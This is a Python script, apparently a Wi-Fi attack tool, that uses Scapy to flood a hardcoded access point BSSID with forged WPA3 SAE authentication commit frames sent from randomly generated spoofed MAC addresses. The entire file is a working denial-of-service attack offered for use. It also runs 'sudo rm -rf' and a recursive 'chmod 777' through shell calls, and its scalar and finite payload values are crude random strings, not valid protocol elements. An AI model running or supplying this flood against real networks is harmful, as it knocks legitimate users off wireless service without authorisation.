import os
import random
from scapy.all import RadioTap, Dot11, Dot11Auth, sendp

# Generate random value for mac address and scalar and finite
def rand_mac():
    return '%02x:%02x:%02x:%02x:%02x:%02x'%(
         random.randint(0,255), random.randint(0,255),
         random.randint(0,255), random.randint(0,255),
         random.randint(0,255), random.randint(0,255)
    )

def generate_values():
    return [f'{random.randint(1, 10000):04x}' for _ in range(10)]

scalar_list = generate_values()
finite_list = generate_values()

def scalar():
    return random.choice(scalar_list)
Scalar = scalar()

def finite():
    return random.choice(finite_list)
Finite = finite()

def create_mac_file(count, filename):
    os.system('sudo rm -rf "%s"' % filename)
    for n in range(int(count)):
        mac = '%02x:%02x:%02x:%02x:%02x:%02x' % (random.randint(0, 255), random.randint(0, 255),random.randint(0, 255), random.randint(0,255),random.randint(0, 255), random.randint(0,255))
        with open(filename, 'a') as fs:
            fs.write(str(mac))
            fs.write('\n')
            fs.close()
    global f
    f = open(filename, 'r')
    os.system('sudo chmod 777 -R "%s" ' % filename)

# Create commit frame
def auth_frame_fromfile():
    client = f.readline().strip()
    return RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid) / Dot11Auth(algo=3,seqnum=1,status=0)
 

def Auth_commit(mac):
    return RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2= mac, addr3=bssid) / Dot11Auth(algo=3,seqnum=1,status=0)
 
def commit_attack(count, iface):
    for i in range(int(count)):
        random_commit = Auth_commit(rand_mac()) / group / Scalar / Finite
        sendp(random_commit, inter=0.00001, count=5, iface="%s" % iface)



group = b'\x13\x00'
confirm = 'valid_confirm'
bssid = '0A:AF:03:7A:09:6C'
count = 256
iface = 'wlan0'

create_mac_file(count, 'mac_addresses.txt')

commit_attack(count, iface)